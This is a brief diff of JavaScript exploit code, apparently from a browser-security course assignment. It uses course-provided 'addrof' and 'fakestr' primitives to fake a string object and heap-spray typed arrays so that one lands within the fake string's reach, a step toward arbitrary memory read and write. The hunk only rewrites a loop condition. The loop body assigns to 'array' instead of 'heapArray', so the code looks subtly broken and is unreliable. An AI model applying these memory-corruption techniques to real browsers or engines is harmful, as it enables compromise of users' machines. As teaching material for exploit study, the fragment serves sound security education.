@@ -7,7 +7,7 @@ let fakedStr = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x0
 
 // use heap spraying to find the address of a typed array in range of fakedstr length
 let heapArray = new Uint32Array(72);
-while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(fakedStr) - 56 + (2 ** 28) < cs361s.addrof(heapArray)) {
+while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(heapArray) > cs361s.addrof(fakedStr) - 56 + (2 ** 28)) {
     array = new Uint32Array(72);
 }
 
